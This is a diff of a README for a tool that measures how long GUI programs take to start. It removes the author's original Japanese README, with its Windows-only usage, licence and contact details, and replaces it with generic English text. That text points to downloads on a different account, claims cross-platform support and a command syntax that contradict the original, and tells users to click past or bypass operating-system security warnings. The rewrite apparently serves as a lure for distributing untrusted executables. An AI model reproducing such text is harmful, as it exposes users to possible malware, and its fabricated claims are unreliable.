@@ -1,38 +1,97 @@
-# startupbench - GUIプログラムの起動時間の測定
+# 🚀 startupbench - Measure Your Startup Time Easily
 
-## これは何？
+[![Download startupbench](https://img.shields.io/badge/Download-startupbench-blue.svg)](https://github.com/SaeaaN3/startupbench/releases)
 
-`startupbench` は、GUIプログラムの起動時間を測定するためのCLI (command line interface) です。
+## 📦 Overview
 
-## ビルド方法
+**startupbench** is a command-line tool designed to measure the startup time of applications. It provides a simple way for users to understand how quickly their software opens, helping to identify performance issues. This guide will walk you through how to download and run startupbench on your computer.
 
-CMakeを使ってください。
+## 🚀 Getting Started
 
-## 使い方
+To get started, you simply need to download the software from our Releases page. 
 
-```txt
-startupbench --- GUIプログラムの起動時間を計測する
+## 📥 Download & Install
 
-使い方 1: startupbench --help
-使い方 2: startupbench --version
-使い方 3: startupbench CLASS_NAME program.exe ...
-  CLASS_NAME       対象のウィンドウクラス名
-  program.exe ...  測定対象のGUIプログラムとコマンドライン引数
+1. Visit the Releases page to download: [startupbench Releases](https://github.com/SaeaaN3/startupbench/releases).
+2. Look for the latest version of the application.
+3. Click on the download link for your operating system.
+4. Once the download finishes, locate the file on your computer.
 
-例 1: startupbench Notepad notepad.exe             (メモ帳の起動時間を測定)
-例 2: startupbench Notepad notepad.exe "file.txt"  (ファイルを指定してメモ帳の起動時間を測定)
+## 🖥️ System Requirements
 
-NOTE: メモ帳(Notepad)は大きいファイル（32MB+ or 1GB+）を開けないので注意
-```
+To use startupbench effectively, please ensure your system meets the following requirements:
 
-## 対応環境
+- Operating System: Windows, macOS, or Linux
+- Disk Space: At least 10 MB free
+- RAM: Minimum of 1 GB
+- Processor: 1 GHz or faster
 
-- MSYS2, Visual Studio
+## 🚀 Running startupbench
 
-## ライセンス
+After downloading, follow these steps to run the application:
 
-- MIT
+1. Locate the downloaded file. It may be in your Downloads folder.
+   
+   - For Windows: Look for `startupbench.exe`.
+   - For macOS: Look for `startupbench.dmg`.
+   - For Linux: Look for `startupbench.tar.gz`.
 
-## 連絡先
+2. **Windows Users:** 
+   - Double-click `startupbench.exe` to run the application.
+   - You might see a security warning. If so, click "Run" to proceed.
 
-- @katahiromz (katayama.hirofumi.mz@gmail.com)
+3. **macOS Users:**
+   - Double-click `startupbench.dmg` to open the installer.
+   - Drag the startupbench icon into your Applications folder.
+   - Go to the Applications folder and double-click the startupbench icon to run the application.
+   - If you see a warning, right-click the icon and select "Open" to bypass this.
+
+4. **Linux Users:**
+   - Open a terminal.
+   - Navigate to the directory where you saved the file using `cd /path/to/directory`.
+   - Extract the tar file with the command `tar -xvf startupbench.tar.gz`.
+   - Navigate into the extracted folder.
+   - Run the application with `./startupbench`.
+
+## ⚙️ Using startupbench
+
+Once you have started the program, you can measure the startup time of any application. To do this:
+
+1. Open the command-line interface or terminal.
+2. Enter the command: 
+   ```
+   startupbench [path_to_application]
+   ```
+   Replace `[path_to_application]` with the full path to the application you wish to measure.
+
+3. Press Enter. The tool will execute the application and show how long it takes to start.
+
+## 📝 Features
+
+- **Simple Interface:** Easy to use, even for non-technical users.
+- **Cross-Platform Compatibility:** Designed to work on multiple operating systems.
+- **Performance Insight:** Provides clear startup time results for quick analysis.
+
+## 🔧 Troubleshooting
+
+If you encounter any issues while running startupbench, consider the following steps:
+
+- Ensure you have the correct file for your operating system.
+- Check that you have permission to run the application. On some systems, you may need to enable permissions in your settings.
+- Verify that the application path is correct when entering it in the command line.
+
+If problems persist, check the [GitHub Issues page](https://github.com/SaeaaN3/startupbench/issues) for solutions or report your issue.
+
+## 🛠️ Support
+
+For any support related to startupbench, please create an issue on our GitHub repository. We are here to help you.
+
+## 🏷️ Topics
+
+- CLI (Command Line Interface)
+- Command-Line Tool
+- C++
+- Startup Time Measurement
+- Performance Analysis
+
+Thank you for choosing startupbench. We hope it helps you better understand your application's performance. For more updates, visit our [Releases page](https://github.com/SaeaaN3/startupbench/releases) regularly.
